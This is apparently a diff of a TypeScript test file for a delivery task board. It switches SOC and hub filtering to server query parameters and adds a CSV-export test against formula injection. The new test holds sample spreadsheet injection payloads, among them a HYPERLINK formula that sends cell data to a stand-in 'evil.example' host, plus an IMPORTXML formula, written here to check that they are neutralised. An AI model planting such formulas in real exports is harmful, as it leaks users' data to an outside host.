@@ -13,7 +13,6 @@ import {
     boardTime,
     cancelTask,
     createTask,
-    filterBoard,
     importTasks,
     patchTask,
     taskBoardQuery,
@@ -80,14 +79,26 @@ describe("boards: GET /v1/tasks by plan day (rows 5, 9, 11)", () => {
     it("sends the type and the day; job-assign sends no type; no day lists the newest tasks", async () => {
         const web = fakeWeb();
         web.on("GET", "/api/go/v1/tasks", () => json(200, { data: [], nextCursor: "c2" }));
-        await runQueryFn(taskBoardQuery({ date: "2026-10-12", type: "first_mile" }));
-        await runQueryFn(taskBoardQuery({ date: "2026-10-12", type: "all" }), "c2");
-        await runQueryFn(taskBoardQuery({ date: "", type: "line_haul" }));
+        await runQueryFn(taskBoardQuery({ date: "2026-10-12", type: "first_mile", soc: "all", hub: "all" }));
+        await runQueryFn(taskBoardQuery({ date: "2026-10-12", type: "all", soc: "all", hub: "all" }), "c2");
+        await runQueryFn(taskBoardQuery({ date: "", type: "line_haul", soc: "all", hub: "all" }));
         const [a, b, c] = web.calls.map((x) => params(x.url));
         expect(a).toEqual({ taskType: "first_mile", date: "2026-10-12", limit: "200" });
         expect(b).toEqual({ date: "2026-10-12", limit: "200", cursor: "c2" });
         expect(c).toEqual({ taskType: "line_haul", limit: "200" });
-        expect(taskBoardQuery({ date: "d", type: "all" }).queryKey).toEqual(["tasks", { date: "d", type: "all" }]);
+        expect(taskBoardQuery({ date: "d", type: "all", soc: "all", hub: "all" }).queryKey).toEqual(["tasks", { date: "d", type: "all", soc: "all", hub: "all" }]);
+    });
+
+    it("the SOC and the source hub are server filters in the key and the request (W9), not a filter over loaded rows", async () => {
+        const web = fakeWeb();
+        web.on("GET", "/api/go/v1/tasks", () => json(200, { data: [] }));
+        const q = taskBoardQuery({ date: "2026-10-12", type: "first_mile", soc: "SOCN", hub: "ALANG-A" });
+        await runQueryFn(q);
+        expect(params(web.calls[0].url)).toEqual({ taskType: "first_mile", date: "2026-10-12", destination: "code:SOCN", sourceHub: "code:ALANG-A", limit: "200" });
+        expect(q.queryKey).toEqual(["tasks", { date: "2026-10-12", type: "first_mile", soc: "SOCN", hub: "ALANG-A" }]);
+        // A different filter is a different list (its own cursor), and the board's ['tasks'] prefix still matches SSE.
+        expect(taskBoardQuery({ date: "2026-10-12", type: "first_mile", soc: "SOCE", hub: "ALANG-A" }).queryKey).not.toEqual(q.queryKey);
+        expect(q.queryKey[0]).toBe("tasks");
     });
 
     it("a task's trip is null when Go answers 404", async () => {
@@ -96,11 +107,7 @@ describe("boards: GET /v1/tasks by plan day (rows 5, 9, 11)", () => {
         expect(await runQueryFn(taskTripQuery("t1"))).toBeNull();
     });
 
-    it("filters the loaded day by SOC key and source, and shows the plan time", () => {
-        const rows = [task(), task({ id: "t2", destinationSocKey: "SOCN", destinationPlace: place("SOCN") }), task({ id: "t3", sourceHub: "X" })];
-        expect(filterBoard(rows, "all", "all").map((r) => r.id)).toEqual(["t1", "t2", "t3"]);
-        expect(filterBoard(rows, "SOCN", "all").map((r) => r.id)).toEqual(["t2"]);
-        expect(filterBoard(rows, "all", "X").map((r) => r.id)).toEqual(["t3"]);
+    it("shows the plan time", () => {
         expect(boardTime(task({ planTime: "09:30:00" }))).toBe("09:30");
         expect(boardTime(task({ planTime: null, actualPickupAt: null }))).toBe("");
     });
@@ -217,6 +224,18 @@ describe("monitor: one aggregate request per page (TW6 M2, TW8 M2: 200 per page)
         expect(narrowed[1][10]).toBe(1200);
         expect(toCsv([["a", 'b"c'], [1, null]])).toBe('﻿a,"b""c"\r\n1,');
         expect(deliveredTimeOf({ deliveredAt: null, stops: multi.stops })).toBe("2026-10-11T03:00:00Z");
+    });
+
+    it("the CSV neutralises a driver-typed formula (CSV injection) and keeps numbers numbers", () => {
+        expect(toCsv([["=1+1", "+x", "-y", "@z"]])).toBe("﻿'=1+1,'+x,'-y,'@z");
+        expect(toCsv([[-5, 0, "-"]])).toBe("﻿-5,0,'-");
+        expect(toCsv([['=HYPERLINK("https://evil.example/?d="&B2,"open")']])).toBe('﻿"\'=HYPERLINK(""https://evil.example/?d=""&B2,""open"")"');
+        expect(toCsv([["\tcmd", "\rx", "ปกติ"]])).toBe("﻿'\tcmd,\"'\rx\",ปกติ");
+        // The seal code the driver typed, through the export's builder.
+        const labels = { headers: ["h"], status: (s: string) => s, stopStatus: (s: string) => s, jobType: (j: string) => j, yes: "Y", no: "N",
+            formatDateTime: (iso: string | null | undefined) => iso ?? "" };
+        const csv = toCsv(buildMonitorExport([monitorRow({ sealCode: "=IMPORTXML(A1)" })], "all", labels));
+        expect(csv).toContain(",'=IMPORTXML(A1),");
     });
 
     it("the trip editor sends the stops only when they changed (PATCH /v1/trips/{id} stops[], T34)", async () => {
